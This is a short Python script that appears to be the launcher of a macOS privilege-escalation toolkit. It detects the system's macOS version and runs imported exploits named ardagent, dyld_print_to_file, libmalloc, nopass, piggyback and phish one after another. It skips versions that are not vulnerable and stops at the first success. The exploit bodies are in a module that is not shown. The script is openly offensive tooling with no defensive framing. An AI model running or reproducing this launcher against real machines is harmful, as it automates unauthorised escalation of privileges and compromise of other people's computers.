#!/usr/bin/env python
import platform
from distutils.version import LooseVersion

from exploits import *

REDC = "\033[91m[-] "
YELLOWC = "\033[93m[!] "
GREENC = "\033[92m[+] "
ENDC = "\033[00m"


def main():
    """main function"""
    version = platform.mac_ver()[0]
    for exploit in [ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, phish]:
        if not exploit.vulnerable(LooseVersion(version)):
            print(YELLOWC + "Skipping %s...\n" % exploit.__name__ + ENDC)
            continue
        print(YELLOWC + "Trying %s...\n" % exploit.__name__ + ENDC)
        try:
            result = exploit.run()
        except KeyboardInterrupt:
            continue
        if result:
            print(GREENC + exploit.__name__ + " was successful!" + ENDC)
            return result
        print(REDC + "Failed\n" + ENDC)
    print(REDC + "All Exploits Failed..." + ENDC)
    return


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nExitting...")
        exit(0)
